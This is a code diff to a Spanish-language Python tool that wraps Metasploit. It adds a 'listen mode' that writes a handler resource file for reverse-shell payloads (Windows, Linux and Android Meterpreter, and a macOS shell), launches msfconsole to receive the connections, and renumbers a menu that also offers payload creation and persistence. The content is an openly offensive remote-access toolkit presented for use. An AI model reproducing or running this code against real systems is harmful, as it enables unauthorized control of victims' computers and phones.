@@ -198,6 +198,68 @@ def msfvenom6(lhost,lport,nombre):
 
 
 
+def msfvenom7(lhost,lport):
+
+    print("Ingresaste al modo escucha elige una de las siguientes opciones:  ")
+    print(" 1 Para Windows")
+    print(" 2 Para Linux")
+    print(" 3 Para Mac")
+    print(" 4 Para Android")
+
+    opcion = input(" >>")
+
+    if opcion == '1':
+
+        file = open(ruta + "metasploit.rc", "w")
+        file.write("use exploit/multi/handler" + os.linesep)
+        file.write("set payload windows/meterpreter/reverse_tcp" + os.linesep)
+        file.write("set LHOST "+ lhost + os.linesep)
+        file.write("set LPORT "+ lport + os.linesep)
+        file.write("exploit")
+        file.close()
+        os.system('clear')
+        print("Modo escucha....")
+        os.system("msfconsole -r" + ruta + "metasploit.rc")
+
+    if opcion == '2':
+        
+        file = open(ruta + "metasploit.rc", "w")
+        file.write("use exploit/multi/handler" + os.linesep)
+        file.write("set payload linux/x86/meterpreter/reverse_tcp" + os.linesep)
+        file.write("set LHOST "+ lhost + os.linesep)
+        file.write("set LPORT "+ lport + os.linesep)
+        file.write("exploit")
+        file.close()
+        os.system('clear')
+        print("Modo escucha....")
+        os.system("msfconsole -r" + ruta + "metasploit.rc")
+
+    if opcion == '3':
+        
+        file = open(ruta + "metasploit.rc", "w")
+        file.write("use exploit/multi/handler" + os.linesep)
+        file.write("set payload osx/x86/shell_reverse_tcp " + os.linesep)
+        file.write("set LHOST "+ lhost + os.linesep)
+        file.write("set LPORT "+ lport + os.linesep)
+        file.write("exploit")
+        file.close()
+        os.system('clear')
+        print("Modo escucha....")
+        os.system("msfconsole -r" + ruta + "metasploit.rc")
+
+    if opcion == '4':
+        
+        file = open(ruta + "metasploit.rc", "w")
+        file.write("use exploit/multi/handler" + os.linesep)
+        file.write("set payload android/meterpreter/reverse_tcp " + os.linesep)
+        file.write("set LHOST "+ lhost + os.linesep)
+        file.write("set LPORT "+ lport + os.linesep)
+        file.write("exploit")
+        file.close()
+        os.system('clear')
+        print("Modo escucha....")
+        os.system("msfconsole -r" + ruta + "metasploit.rc")
+
 def menu():
 
     print('''
@@ -227,8 +289,9 @@ def menu():
     print("\t 4) Crear un Payload para Android")
     print("\t 5) Crear un Payload para PHP")
     print("\t 6) Crear un Payload para Java")
-    print("\t 7) Para Generar Persistencia")
-    print("\t 8) Salir")
+    print("\t 7) Activar Solo El Modo Escucha")
+    print("\t 8) Para Generar Persistencia")
+    print("\t 9) Salir")
 
 
 
@@ -284,8 +347,16 @@ while True:
     	lport = input("Ingresar LPORT >> ")
     	nombre = input("Ingresar Nombre >> ")
     	msfvenom6(lhost,lport,nombre)
+    
 
     if opcionMenu == '7':
+
+        lhost = input( "Ingresar LHOST >> ")
+        lport = input("Ingresar LPORT >> ")
+        msfvenom7(lhost,lport)
+
+
+    if opcionMenu == '8':
 
     	print("Digite 1 para Persistencia de Windows")
     	print("Digite 2 para Persistencia de Mac")
@@ -321,7 +392,7 @@ while True:
     		continuar = input("Presione ENTER continuar....")
     		os.system("clear")	
 
-    if opcionMenu == '8':
+    if opcionMenu == '9':
 
     	salir = input("Desea salir del programa S/N ")
 
